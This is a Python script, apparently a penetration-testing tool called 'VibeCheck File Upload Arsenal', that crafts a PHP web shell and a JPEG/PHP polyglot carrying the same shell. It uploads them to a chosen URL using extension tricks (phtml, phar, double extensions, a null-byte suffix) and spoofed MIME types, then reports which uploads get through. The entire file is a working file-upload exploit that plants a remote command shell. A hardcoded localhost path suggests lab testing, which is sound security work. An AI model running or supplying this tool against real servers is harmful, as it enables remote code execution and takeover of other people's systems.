import requests
import os
import argparse

# --- COLORS FOR KALI TERMINAL ---
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
W = '\033[0m'   # White

def banner():
    print(f"""{G}
    __   _ __           ________              __  
    \ \ / /(_)        / ____/ /_  ___  _____/ /__
     \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
      \ / / / |     / /___/ / / /  __/ /__/ ,<   
       \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
                /_____/ File Upload Arsenal v1.0
    {W}""")

def generate_polyglot_php_jpeg():
    """Generates a JPEG with a hidden PHP system payload"""
    jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01'
    php_payload = b'<?php system($_GET["cmd"]); ?>'
    return jpeg_header + php_payload + b'\xff\xd9'

def start_scan(target_url, param_name):
    # 1. Setup Payloads
    payload_content = "<?php system($_GET['cmd']); ?>"
    poly_content = generate_polyglot_php_jpeg()
    
    # 2. Extension List (From your checklist)
    extensions = ['php', 'php5', 'phtml', 'phar', 'asp', 'aspx', 'png.php', 'php.jpg', 'php%00.jpg']
    
    # 3. MIME types to spoof
    mimes = ['image/jpeg', 'image/png', 'application/octet-stream']

    print(f"[*] Starting scan on {target_url}...\n")

    for ext in extensions:
        for mime in mimes:
            # Determine filename: some bypasses use double extensions
            filename = f"vibecheck.{ext}.jpg" if "jpg" in ext else f"vibecheck.{ext}"
            
            # Use polyglot content for image-like extensions, otherwise plain PHP
            content = poly_content if "jpg" in ext or "png" in ext else payload_content
            
            files = {param_name: (filename, content, mime)}
            
            try:
                r = requests.post(target_url, files=files, timeout=5)
                
                # IMPROVED DETECTION: Check for status 200 AND common success words
                success_keywords = ["[+]", "success", "uploaded", "path"]
                is_success = any(word in r.text.lower() for word in success_keywords)

                if r.status_code == 200 and is_success:
                    print(f"{G}[+] UPLOAD SUCCESS: {filename} | MIME: {mime}{W}")
                    # Extract the path if it's in the response
                    print(f"    Target: http://localhost:8080/uploads/{filename}")
                else:
                    print(f"{Y}[-] Blocked/Failed: {filename} (Status: {r.status_code}){W}")

                    
            except Exception as e:
                print(f"{R}[!] Connection Error: {e}{W}")


if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="VibeCheck File Upload Vulnerability Tester")
    parser.add_argument("-u", "--url", required=True, help="Target Upload URL")
    parser.add_argument("-p", "--param", required=True, help="Name of the file parameter (e.g., 'file' or 'image')")
    
    args = parser.parse_args()
    start_scan(args.url, args.param)
